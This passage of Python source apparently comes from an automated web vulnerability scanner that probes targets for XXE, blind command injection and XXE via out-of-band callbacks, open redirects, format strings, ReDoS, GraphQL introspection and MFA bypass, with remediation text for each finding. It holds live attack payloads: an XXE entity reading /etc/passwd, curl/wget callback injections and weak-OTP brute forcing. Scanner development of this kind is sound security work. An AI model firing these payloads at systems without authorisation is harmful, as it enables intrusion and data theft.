        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x attr="&xxe;" />',
         ["root:x:0:0"], "Attribute entity injection"),
    ]

    async def _test_xxe(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test for XML External Entity injection by sending XML payloads to
        endpoints that may parse XML (detected by content-type or path).
        """
        flaws: List[Dict[str, Any]] = []
        confirmed: set = set()
        MAX_XXE_REQUESTS = int(self.config.get("max_xxe_requests", 150))
        total = 0

        XML_HEADERS = {"Content-Type": "application/xml"}
        HARDCODED_XML_PATHS = [
            "/api/upload", "/api/import", "/api/parse", "/api/xml",
            "/api/data", "/api/feed", "/api/export", "/api/convert",
            "/api/v1/import", "/api/v1/upload",
        ]
        seen: set = set()
        paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        for p in HARDCODED_XML_PATHS:
            if p not in seen:
                seen.add(p)
                paths.append(p)

        for path in paths:
            if total >= MAX_XXE_REQUESTS:
                break
            url = self.target + path
            for xml_payload, markers, technique in self._XXE_PAYLOADS:
                key = (url, technique)
                if key in confirmed or total >= MAX_XXE_REQUESTS:
                    break
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.post(
                        url, data=xml_payload.encode(),
                        headers=XML_HEADERS
                    ) as resp:
                        body = await resp.text(errors="replace") if resp.status in (200, 400, 500) else ""
                    total += 1
                    if body and any(m.lower() in body.lower() for m in markers):
                        confirmed.add(key)
                        flaws.append({
                            "type": "xxe",
                            "technique": technique,
                            "endpoint": url,
                            "method": "POST",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE ({technique}) at {path}: external entity resolved "
                                f"and content reflected in response."
                            ),
                            "proof": {
                                "payload_type": technique,
                                "response_snippet": body[:400],
                            },
                            "remediation": [
                                "Disable external entity processing in the XML parser.",
                                "Use defusedxml (Python) or equivalent safe XML parser.",
                                "Validate and reject DOCTYPE declarations from user input.",
                            ],
                        })
                        break
                except Exception as exc:
                    logger.debug("[Logic] XXE POST %s: %s", url, exc)

        logger.info("[Logic] XXE scan: %d findings (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  OOB - Blind Command Injection                                      #
    # ------------------------------------------------------------------ #

    async def _test_blind_cmdi_oob(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Blind OS command injection detection via OOB HTTP callback.
        Injects curl/wget payloads that, if executed, will call back to the
        DS1 Hunter OOB server. Requires OOB server to be running and reachable.
        """
        if not self.oob_client:
            return []

        flaws: List[Dict[str, Any]] = []
        CMDI_PARAMS = ["cmd", "exec", "command", "run", "query", "search",
                       "name", "id", "input", "arg", "shell", "ping", "host"]
        CMDI_PATHS  = ["/api/ping", "/api/exec", "/api/run", "/api/command",
                       "/api/shell", "/api/debug", "/ping", "/exec",
                       "/api/admin/exec", "/api/v1/exec"]

        seen: set = set()
        paths: list = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        for p in CMDI_PATHS:
            if p not in seen:
                paths.append(p)

        total = 0
        MAX_OOB_CMDI = 150

        for path in paths:
            if total >= MAX_OOB_CMDI:
                break
            url = self.target + path
            token = self.oob_client.generate_token("cmdi")
            blind_payloads = self.oob_client.blind_cmdi_payloads(token)

            for param in CMDI_PARAMS[:6]:
                if total >= MAX_OOB_CMDI:
                    break
                for bp in blind_payloads[:4]:   # top 4 variants
                    if total >= MAX_OOB_CMDI:
                        break
                    try:
                        await asyncio.sleep(self.rate_limit)
                        # GET param
                        async with session.get(
                            f"{url}?{param}={bp}",
                            timeout=aiohttp.ClientTimeout(total=5),
                        ) as _:
                            pass
                        total += 1
                        self.oob_client.register_pending(
                            token, "blind_command_injection",
                            {"url": url, "param": param, "payload": bp, "method": "GET"},
                        )
                    except Exception:
                        pass

        # Collect confirmed callbacks (wait for target to execute the command)
        confirmed = await self.oob_client.collect_confirmed(wait_secs=10.0)
        for token, vuln_type, ctx, cb in confirmed:
            flaws.append({
                "type": "blind_command_injection",
                "endpoint": ctx["url"],
                "method": ctx["method"],
                "severity": "CRITICAL",
                "description": (
                    f"Blind OS command injection (OOB confirmed) at "
                    f"{ctx['url']}?{ctx['param']}=: "
                    f"injected curl payload executed - callback received from "
                    f"{cb.get('src_ip', 'unknown')}."
                ),
                "proof": {
                    "detection_method": "OOB_HTTP_callback",
                    "param": ctx["param"],
                    "payload": ctx["payload"],
                    "callback_src_ip": cb.get("src_ip"),
                    "callback_time": cb.get("time"),
                    "oob_token": token,
                },
                "evidence": build_evidence(
                    method=ctx["method"],
                    url=f"{ctx['url']}?{ctx['param']}={ctx['payload']}",
                    resp_body=f"[OOB callback received from {cb.get('src_ip')}]",
                ),
                "remediation": [
                    "Never pass user input to OS commands.",
                    "Use APIs that avoid the shell entirely.",
                    "Apply strict input validation - whitelist expected values.",
                ],
            })

        logger.info("[Logic] Blind CMDi OOB: %d confirmed (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  OOB - Blind XXE                                                     #
    # ------------------------------------------------------------------ #

    async def _test_blind_xxe_oob(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Blind XXE detection via OOB HTTP callback.
        Injects an XML external entity that fetches the OOB URL.
        Detects XXE even when the server doesn't reflect entity output.
        """
        if not self.oob_client:
            return []

        flaws: List[Dict[str, Any]] = []
        XML_PATHS = ["/api/import", "/api/upload", "/api/parse", "/api/xml",
                     "/api/data", "/api/feed", "/api/v1/import", "/import",
                     "/upload", "/api/webhook", "/api/export"]

        seen: set = set()
        paths: list = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        for p in XML_PATHS:
            if p not in seen:
                paths.append(p)

        total = 0
        MAX_OOB_XXE = 80

        for path in paths:
            if total >= MAX_OOB_XXE:
                break
            url = self.target + path
            token  = self.oob_client.generate_token("xxe")
            payload = self.oob_client.blind_xxe_payload(token)

            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=aiohttp.ClientTimeout(total=5),
                ) as _:
                    pass
                total += 1
                self.oob_client.register_pending(
                    token, "blind_xxe",
                    {"url": url, "payload": payload, "method": "POST"},
                )
            except Exception:
                pass

        # Collect confirmed callbacks
        confirmed = await self.oob_client.collect_confirmed(wait_secs=10.0)
        for token, vuln_type, ctx, cb in confirmed:
            flaws.append({
                "type": "blind_xxe",
                "endpoint": ctx["url"],
                "method": "POST",
                "severity": "CRITICAL",
                "description": (
                    f"Blind XXE (OOB confirmed) at {ctx['url']}: "
                    f"XML external entity resolved and fetched OOB URL - "
                    f"callback received from {cb.get('src_ip', 'unknown')}."
                ),
                "proof": {
                    "detection_method": "OOB_HTTP_callback",
                    "payload_snippet": ctx["payload"][:200],
                    "callback_src_ip": cb.get("src_ip"),
                    "callback_time": cb.get("time"),
                    "oob_token": token,
                },
                "evidence": build_evidence(
                    method="POST",
                    url=ctx["url"],
                    req_body=ctx["payload"][:500],
                    resp_body=f"[OOB callback received from {cb.get('src_ip')}]",
                ),
                "remediation": [
                    "Disable XML external entity (XXE) processing in all XML parsers.",
                    "Use lxml with resolve_entities=False and no_network=True.",
                    "Prefer JSON over XML for API inputs.",
                ],
            })

        logger.info("[Logic] Blind XXE OOB: %d confirmed (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Open Redirect                                                 #
    # ------------------------------------------------------------------ #

    # Canary domain - never actually visited, just used to detect the header
    _REDIRECT_CANARY = "https://ds1hunter-openredirect-canary.invalid"

    _REDIRECT_PAYLOADS = [
        # Absolute URLs
        "https://ds1hunter-openredirect-canary.invalid",
        "http://ds1hunter-openredirect-canary.invalid",
        # Protocol-relative (scheme-less)
        "//ds1hunter-openredirect-canary.invalid",
        # Triple slash
        "///ds1hunter-openredirect-canary.invalid",
        # URL-encoded slash
        "%2F%2Fds1hunter-openredirect-canary.invalid",
        # Double-encoded
        "%252F%252Fds1hunter-openredirect-canary.invalid",
        # Backslash bypass (IE/Edge)
        "\\\\ds1hunter-openredirect-canary.invalid",
        "/\\ds1hunter-openredirect-canary.invalid",
        # @-bypass: browser goes to domain after @
        "https://legitimate.example.com@ds1hunter-openredirect-canary.invalid",
        # Fragment bypass
        "https://ds1hunter-openredirect-canary.invalid#@legitimate.example.com",
        # Subdomain confusion
        "https://ds1hunter-openredirect-canary.invalid.legitimate.example.com",
        # Hex-encoded full URL
        "%68%74%74%70%73%3a%2f%2fds1hunter-openredirect-canary.invalid",
        # CRLF + Location injection
        "%0d%0aLocation:https://ds1hunter-openredirect-canary.invalid",
        "%0aLocation:https://ds1hunter-openredirect-canary.invalid",
        # IP decimal (192.0.2.1 = TEST-NET)
        "http://3221225985",
        # Tab/newline prefix
        "\thttps://ds1hunter-openredirect-canary.invalid",
        # Null byte
        "https://ds1hunter-openredirect-canary.invalid%00",
        # JavaScript scheme
        "javascript:alert(1)",
        # Data URI
        "data:text/html,<script>alert(1)</script>",
    ]

    _REDIRECT_PARAMS = [
        "next", "url", "redirect", "redirect_to", "redirect_url",
        "return", "return_to", "returnUrl", "returnurl",
        "continue", "goto", "redir", "destination", "dest",
        "target", "forward", "location", "callback", "link",
        "to", "back", "from", "ref", "referer", "out",
        "exit", "view", "path", "go",
    ]

    _REDIRECT_PATHS = [
        "/login", "/logout", "/auth/login", "/auth/logout",
        "/api/auth/login", "/api/logout", "/api/auth/logout",
        "/oauth/authorize", "/oauth/callback",
        "/sso", "/sso/callback", "/saml/acs",
        "/", "/home", "/dashboard",
    ]

    async def _test_open_redirect(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect open redirects by injecting an external canary domain into
        redirect-related GET parameters and checking if the server responds
        with a 3xx Location header pointing to the canary.

        Uses allow_redirects=False so we intercept the redirect without
        following it - safe and reliable.
        """
        flaws: List[Dict[str, Any]] = []
        confirmed: set = set()
        MAX_REDIR_REQUESTS = int(self.config.get("max_redirect_requests", 400))
        total = 0

        # Build path list: discovered endpoints first, hardcoded fallbacks second
        seen: set = set()
        paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        for p in self._REDIRECT_PATHS:
            if p not in seen:
                seen.add(p)
                paths.append(p)

        canary_lower = "ds1hunter-openredirect-canary.invalid"

        for path in paths:
            if total >= MAX_REDIR_REQUESTS:
                break
            url = self.target + path

            for param in self._REDIRECT_PARAMS:
                if total >= MAX_REDIR_REQUESTS:
                    break
                key = (url, param)
                if key in confirmed:
                    continue

                for payload in self._REDIRECT_PAYLOADS:
                    if total >= MAX_REDIR_REQUESTS or key in confirmed:
                        break
                    test_url = f"{url}?{param}={payload}"
                    try:
                        await asyncio.sleep(self.rate_limit)
                        async with session.get(
                            test_url,
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            status       = resp.status
                            location     = resp.headers.get("Location", "")
                            resp_headers = dict(resp.headers)
                            body_snippet = ""
                            if status == 200:
                                raw = await resp.read()
                                body_snippet = raw[:1000].decode(errors="replace")
                        total += 1

                        # Detection: 3xx with canary in Location header
                        redirect_hit = (
                            status in (301, 302, 303, 307, 308)
                            and canary_lower in location.lower()
                        )
                        # Detection: 200 with canary reflected in body (meta-refresh / JS redirect)
                        body_hit = canary_lower in body_snippet.lower()

                        if redirect_hit or body_hit:
                            confirmed.add(key)
                            method = "header" if redirect_hit else "body_reflection"
                            flaws.append({
                                "type": "open_redirect",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "HIGH",
                                "description": (
                                    f"Open redirect at {path}?{param}=: "
                                    f"payload '{payload}' caused {'HTTP ' + str(status) + ' Location redirect' if redirect_hit else 'canary reflection in response body'}. "
                                    f"Attackers can craft phishing links that appear to originate from this domain."
                                ),
                                "proof": {
                                    "param":           param,
                                    "payload":         payload,
                                    "detection":       method,
                                    "response_status": status,
                                    "location_header": location,
                                },
                                "evidence": build_evidence(
                                    method="GET",
                                    url=test_url,
                                    resp_status=status,
                                    resp_headers=resp_headers,
                                    resp_body=location or body_snippet[:500],
                                ),
                                "remediation": [
                                    "Validate redirect destinations against a strict allowlist of known-good domains.",
                                    "Use relative paths for internal redirects instead of accepting full URLs.",
                                    "If external redirects are required, show a warning page before redirecting.",
                                    "Reject any redirect URL containing a scheme (http://, https://) unless it matches your domain.",
                                ],
                            })
                            break   # one confirmed finding per (url, param) is enough

                    except Exception as exc:
                        logger.debug("[Logic] Open redirect %s?%s: %s", url, param, exc)

        logger.info("[Logic] Open redirect scan: %d findings (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  Deserialization                                                     #
    # ------------------------------------------------------------------ #

    async def _test_deserialization(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.advanced_scanner import DeserializationScanner
            return await DeserializationScanner(
                self.target,
                self.config,
                discovered_endpoints=list(self._discovered_endpoints),
            ).run(session)
        except Exception as exc:
            logger.debug("[Logic] Deserialization scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Prototype Pollution                                                 #
    # ------------------------------------------------------------------ #

    async def _test_prototype_pollution(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.advanced_scanner import PrototypePollutionScanner
            return await PrototypePollutionScanner(self.target, self.config).run(session)
        except Exception as exc:
            logger.debug("[Logic] Prototype pollution scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Cache Poisoning                                                     #
    # ------------------------------------------------------------------ #

    async def _test_cache_poisoning(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.advanced_scanner import CachePoisoningScanner
            return await CachePoisoningScanner(self.target, self.config).run(session)
        except Exception as exc:
            logger.debug("[Logic] Cache poisoning scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  OAuth 2.0 Flow Attacks                                              #
    # ------------------------------------------------------------------ #

    async def _test_oauth_flows(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.advanced_scanner import OAuthFlowScanner
            return await OAuthFlowScanner(self.target, self.config).run(session)
        except Exception as exc:
            logger.debug("[Logic] OAuth flow scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  HTTP Request Smuggling                                              #
    # ------------------------------------------------------------------ #

    async def _test_http_smuggling(self) -> List[Dict[str, Any]]:
        """
        Delegate to HTTPSmugglingScanner which uses raw asyncio TCP so it
        can send the malformed CL/TE payloads aiohttp normalises away.
        """
        try:
            from core.modules.smuggling_scanner import HTTPSmugglingScanner
            scanner = HTTPSmugglingScanner(self.target, self.config)
            return await scanner.run()
        except Exception as exc:
            logger.debug("[Logic] Smuggling scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  CORS Misconfiguration                                               #
    # ------------------------------------------------------------------ #

    async def _test_cors(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.cors_scanner import CORSScanner
            return await CORSScanner(self.target, self.config).run(session)
        except Exception as exc:
            logger.debug("[Logic] CORS scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Clickjacking                                                        #
    # ------------------------------------------------------------------ #

    async def _test_clickjacking(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.clickjacking_scanner import ClickjackingScanner
            return await ClickjackingScanner(self.target, self.config).run(session)
        except Exception as exc:
            logger.debug("[Logic] Clickjacking scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  DOM XSS                                                             #
    # ------------------------------------------------------------------ #

    async def _test_dom_xss(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        try:
            from core.modules.dom_xss_scanner import DOMXSSScanner
            return await DOMXSSScanner(self.target, self.config).run(session)
        except Exception as exc:
            logger.debug("[Logic] DOM XSS scanner error: %s", exc)
            return []

    # ------------------------------------------------------------------ #
    #  Integer Overflow                                                    #
    # ------------------------------------------------------------------ #

    async def _test_integer_overflow(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Send INT_MAX, UINT_MAX, -1, INT_MIN in numeric params/fields to detect overflow handling."""
        flaws = []
        _INT_VALUES = [
            ("int32_max+1", 2147483648),
            ("uint32_max",  4294967295),
            ("neg_one",     -1),
            ("int32_min",   -2147483648),
            ("int64_max",   9223372036854775807),
        ]
        _NUMERIC_PARAMS = [
            "id", "user_id", "account_id", "quantity", "amount", "price",
            "page", "limit", "offset", "count", "order_id", "product_id",
            "balance", "age", "year", "size",
        ]
        _INT_ERROR_RE = re.compile(
            r"overflow|out of range|integer|value too large|numeric|"
            r"exceeds maximum|invalid value|constraint|not a number|NaN",
            re.I,
        )
        endpoints = [self.target]
        if self._discovered_endpoints:
            endpoints += self._discovered_endpoints[:5]  # cap at 6 total (1 + 5 discovered)

        _int_deadline = _time.monotonic() + 75  # 75s hard cap for entire overflow test
        for base_url in endpoints:
            if _time.monotonic() > _int_deadline:
                break
            for label, val in _INT_VALUES:
                if _time.monotonic() > _int_deadline:
                    break
                for param in _NUMERIC_PARAMS:
                    try:
                        await asyncio.sleep(self.rate_limit)
                        test_url = f"{base_url}?{param}={val}"
                        async with session.get(test_url) as resp:
                            body = await resp.text(errors="replace")
                            if resp.status == 500 or _INT_ERROR_RE.search(body):
                                flaws.append({
                                    "type": "integer_overflow",
                                    "endpoint": test_url,
                                    "method": "GET",
                                    "severity": "HIGH",
                                    "description": (
                                        f"Integer overflow: param '{param}={val}' ({label}) "
                                        f"returned HTTP {resp.status}"
                                    ),
                                    "proof": {
                                        "param": param, "value": val,
                                        "status": resp.status, "excerpt": body[:300],
                                    },
                                    "remediation": [
                                        "Validate numeric inputs against safe ranges before processing",
                                        "Use language integer types matching DB column types",
                                        "Reject values outside expected business range at API boundary",
                                    ],
                                })
                                break
                    except Exception as exc:
                        logger.debug("[Logic] IntOverflow GET %s: %s", base_url, exc)
            # POST body test
            if _time.monotonic() > _int_deadline:
                break
            for label, val in _INT_VALUES[:3]:
                try:
                    await asyncio.sleep(self.rate_limit)
                    payload = {"quantity": val, "amount": val, "price": val, "id": val}
                    async with session.post(base_url, json=payload) as resp:
                        body = await resp.text(errors="replace")
                        if resp.status == 500 or _INT_ERROR_RE.search(body):
                            flaws.append({
                                "type": "integer_overflow",
                                "endpoint": base_url,
                                "method": "POST",
                                "severity": "HIGH",
                                "description": f"Integer overflow in POST body ({label}): HTTP {resp.status}",
                                "proof": {"payload": payload, "status": resp.status, "excerpt": body[:300]},
                                "remediation": ["Clamp and validate all numeric fields in request body"],
                            })
                            break
                except Exception as exc:
                    logger.debug("[Logic] IntOverflow POST %s: %s", base_url, exc)
        return flaws

    # ------------------------------------------------------------------ #
    #  ReDoS                                                               #
    # ------------------------------------------------------------------ #

    async def _test_redos(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Regex DoS: crafted strings that trigger catastrophic backtracking."""
        flaws = []
        _REDOS_PAYLOADS = [
            "a" * 50 + "!",
            "a" * 30 + "b" + "a" * 30 + "!",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!",
            "a" * 100,
            "x" + "a" * 50 + "x",
        ]
        _TEST_PARAMS = [
            "q", "search", "query", "email", "username", "name",
            "pattern", "filter", "input", "keyword",
        ]
        # Measure baseline
        baseline_times = []
        try:
            for _ in range(2):
                t0 = _time.monotonic()
                async with session.get(self.target, timeout=aiohttp.ClientTimeout(total=5)) as r:
                    await r.read()
                baseline_times.append(_time.monotonic() - t0)
        except Exception:
            baseline_times = [0.5, 0.5]
        baseline_med = sorted(baseline_times)[len(baseline_times) // 2]
        spike_threshold = max(3.0, baseline_med * 5)

        endpoints = [self.target]
        if self._discovered_endpoints:
            endpoints += self._discovered_endpoints[:5]

        for base_url in endpoints:
            for payload in _REDOS_PAYLOADS:
                for param in _TEST_PARAMS:
                    try:
                        test_url = f"{base_url}?{param}={payload}"
                        t0 = _time.monotonic()
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            await resp.read()
                        elapsed = _time.monotonic() - t0
                        if elapsed >= spike_threshold:
                            flaws.append({
                                "type": "redos",
                                "endpoint": test_url,
                                "method": "GET",
                                "severity": "HIGH",
                                "description": (
                                    f"ReDoS: param '{param}' caused {elapsed:.2f}s response "
                                    f"(baseline {baseline_med:.2f}s)"
                                ),
                                "proof": {
                                    "param": param, "payload": payload,
                                    "baseline_ms": int(baseline_med * 1000),
                                    "attack_ms": int(elapsed * 1000),
                                },
                                "remediation": [
                                    "Audit all regex patterns for catastrophic backtracking",
                                    "Use possessive quantifiers or atomic groups",
                                    "Set per-request regex execution timeouts",
                                    "Consider RE2/re2 library (linear-time guarantees)",
                                ],
                            })
                            break
                    except asyncio.TimeoutError:
                        flaws.append({
                            "type": "redos",
                            "endpoint": f"{base_url}?{param}={payload}",
                            "method": "GET",
                            "severity": "HIGH",
                            "description": f"ReDoS: param '{param}' caused request timeout (>10s)",
                            "proof": {"param": param, "payload": payload, "result": "timeout"},
                            "remediation": ["Audit regex patterns for catastrophic backtracking"],
                        })
                    except Exception as exc:
                        logger.debug("[Logic] ReDoS %s: %s", base_url, exc)
        return flaws

    # ------------------------------------------------------------------ #
    #  Format String Injection                                             #
    # ------------------------------------------------------------------ #

    async def _test_format_string_injection(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Format string probes (%p %x %n) for C-based servers and logging functions."""
        flaws = []
        _FMT_PAYLOADS = [
            ("%p " * 10,   "pointer_leak"),
            ("%x " * 10,   "hex_leak"),
            ("%s " * 5,    "string_deref"),
            ("%n",          "write_attempt"),
            ("%.1000d",     "precision_flood"),
            ("%99999999d",  "extreme_width"),
            ("%p%p%p%p%p%p%p%p", "compact_pointer"),
        ]
        _FMT_DETECT = re.compile(
            r"0x[0-9a-fA-F]{6,}|segfault|sigsegv|access.violation|"
            r"stack.smash|core.dump|\(nil\)|ffff[0-9a-fA-F]{4,}",
            re.I,
        )
        _TEST_PARAMS = [
            "name", "msg", "message", "log", "text", "query", "q",
            "search", "username", "email", "input", "label",
        ]
        endpoints = [self.target]
        if self._discovered_endpoints:
            endpoints += self._discovered_endpoints[:8]

        for base_url in endpoints:
            for fmt_payload, label in _FMT_PAYLOADS:
                for param in _TEST_PARAMS:
                    try:
                        await asyncio.sleep(self.rate_limit)
                        test_url = f"{base_url}?{param}={fmt_payload}"
                        async with session.get(test_url) as resp:
                            body = await resp.text(errors="replace")
                            if _FMT_DETECT.search(body):
                                flaws.append({
                                    "type": "format_string_injection",
                                    "endpoint": test_url,
                                    "method": "GET",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Format string injection ({label}): "
                                        f"memory content detected in response"
                                    ),
                                    "proof": {
                                        "param": param, "payload": fmt_payload,
                                        "status": resp.status, "excerpt": body[:300],
                                    },
                                    "remediation": [
                                        "Never pass user input directly to printf/sprintf",
                                        "Use printf('%s', user_input) - never printf(user_input)",
                                        "Audit all logging calls for direct user-input interpolation",
                                    ],
                                })
                                break
                    except Exception as exc:
                        logger.debug("[Logic] FmtStr %s: %s", base_url, exc)
        return flaws

    # ------------------------------------------------------------------ #
    #  Large Input → Information Disclosure                                #
    # ------------------------------------------------------------------ #

    async def _test_large_input_disclosure(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Send large inputs; detect information disclosure via stack traces / error dumps."""
        flaws = []
        _PAYLOADS = [
            ("8k_alpha",    "A" * 8192),
            ("64k_alpha",   "A" * 65536),
            ("null_bytes",  "\x00" * 1024),
            ("unicode_flood", "ñ" * 4096),
        ]
        _DISCLOSURE_RE = [
            (re.compile(r"Traceback \(most recent call last\)", re.I), "CRITICAL", "Python stack trace"),
            (re.compile(r"\tat \w[\w.$]+\(\w+\.java:\d+\)",      re.I), "HIGH",     "Java stack trace"),
            (re.compile(r"Warning:.*on line \d+",                 re.I), "HIGH",     "PHP warning"),
            (re.compile(r"<b>Fatal error</b>",                    re.I), "HIGH",     "PHP fatal error"),
            (re.compile(r"System\.[A-Z]\w+Exception",             re.I), "HIGH",     ".NET exception"),
            (re.compile(r'"stack"\s*:\s*"[^"]{30}',               re.I), "HIGH",     "Stack trace in JSON"),
            (re.compile(r"RuntimeError|MemoryError|OverflowError", re.I), "HIGH",    "Python runtime error"),
            (re.compile(r"django\.core\.|flask\.app\.|rails.*RuntimeError", re.I), "HIGH", "Framework internals"),
        ]
        _TEST_PARAMS = ["q", "search", "input", "data", "text", "query", "name", "value"]
        endpoints = [self.target]
        if self._discovered_endpoints:
            endpoints += self._discovered_endpoints[:8]

        for base_url in endpoints:
            for size_label, payload in _PAYLOADS:
                for param in _TEST_PARAMS:
                    try:
                        await asyncio.sleep(self.rate_limit)
                        async with session.post(
                            base_url, data={param: payload},
                            timeout=aiohttp.ClientTimeout(total=15),
                        ) as resp:
                            body = await resp.text(errors="replace")
                            for pattern, sev, desc in _DISCLOSURE_RE:
                                if pattern.search(body):
                                    flaws.append({
                                        "type": "large_input_disclosure",
                                        "endpoint": base_url,
                                        "method": "POST",
                                        "severity": sev,
                                        "description": (
                                            f"Info disclosure via large input ({size_label}): {desc}"
                                        ),
                                        "proof": {
                                            "param": param,
                                            "payload_size": len(payload),
                                            "status": resp.status,
                                            "match": desc,
                                            "excerpt": body[:400],
                                        },
                                        "remediation": [
                                            "Disable debug mode in production (DEBUG=False)",
                                            "Set server-side input length limits",
                                            "Use generic error pages instead of stack traces",
                                            "Configure proper error-handling middleware",
                                        ],
                                    })
                                    break
                    except Exception as exc:
                        logger.debug("[Logic] LargeInput %s: %s", base_url, exc)
        return flaws

    # ------------------------------------------------------------------ #
    #  GraphQL Scanner                                                     #
    # ------------------------------------------------------------------ #

    async def _test_graphql(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Check for GraphQL introspection and injection on common GraphQL endpoints."""
        flaws = []
        candidates = ["/graphql", "/api/graphql", "/graphql/v1", "/graph", "/graphiql"]
        if self._discovered_endpoints:
            candidates += [
                ep for ep in self._discovered_endpoints
                if "graphql" in ep.lower() or "/graph" in ep.lower()
            ]

        _INTROSPECTION_QUERY = '{ __schema { queryType { name } types { name kind } } }'
        seen = set()
        for path in candidates:
            url = (self.target.rstrip("/") + path) if not path.startswith("http") else path
            if url in seen:
                continue
            seen.add(url)
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(
                    url,
                    json={"query": _INTROSPECTION_QUERY},
                    headers={"Content-Type": "application/json"},
                ) as resp:
                    if resp.status >= 400:
                        continue
                    body = await resp.json(content_type=None)
                    if isinstance(body, dict) and "data" in body and body["data"]:
                        schema = body["data"].get("__schema") or body["data"].get("__type")
                        if schema:
                            flaws.append({
                                "type": "graphql_introspection",
                                "endpoint": url,
                                "method": "POST",
                                "severity": "HIGH",
                                "description": f"GraphQL introspection enabled at {url} - full schema disclosed",
                                "proof": {"status": resp.status, "schema_found": True},
                                "remediation": [
                                    "Disable introspection in production",
                                    "Apply query depth and complexity limits",
                                    "Use persisted queries only",
                                ],
                            })
            except Exception as exc:
                logger.debug("[Logic] GraphQL probe %s: %s", url, exc)
        return flaws

    # ------------------------------------------------------------------ #
    #  MFA / 2FA Bypass                                                    #
    # ------------------------------------------------------------------ #

    async def _test_mfa_bypass(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Test MFA/2FA bypass: skip step, reuse token, brute weak OTP."""
        flaws = []
        mfa_paths = [
            "/api/mfa/verify", "/api/2fa/verify", "/api/otp/verify",
            "/api/auth/mfa",   "/api/auth/2fa",   "/api/auth/otp",
            "/mfa/verify",     "/2fa/verify",      "/otp/verify",
        ]
        dashboard_paths = ["/dashboard", "/api/me", "/api/users/me", "/home", "/app"]
        weak_otps = ["000000", "111111", "123456", "999999", "000001", "111112"]

        # Test 1: skip MFA step - access dashboard directly without completing MFA
        for dash_path in dashboard_paths:
            url = self.target.rstrip("/") + dash_path
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.get(url) as resp:
                    if resp.status == 200:
                        body = await resp.text(errors="replace")
                        sensitive_keys = ["user", "account", "profile", "email", "balance"]
                        if any(k in body.lower() for k in sensitive_keys):
                            flaws.append({
                                "type": "mfa_bypass",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "CRITICAL",
                                "description": f"MFA bypass: dashboard accessible without MFA completion at {url}",
                                "proof": {"status": resp.status, "path": dash_path},
                                "remediation": [
                                    "Enforce MFA completion before any authenticated resource access",
                                    "Use server-side session state to track MFA step completion",
                                ],
                            })
            except Exception as exc:
                logger.debug("[Logic] MFA skip test %s: %s", url, exc)

        # Test 2: brute weak OTP on known MFA endpoints
        for path in mfa_paths:
            url = self.target.rstrip("/") + path
            for otp in weak_otps:
                try:
                    await asyncio.sleep(self.rate_limit)
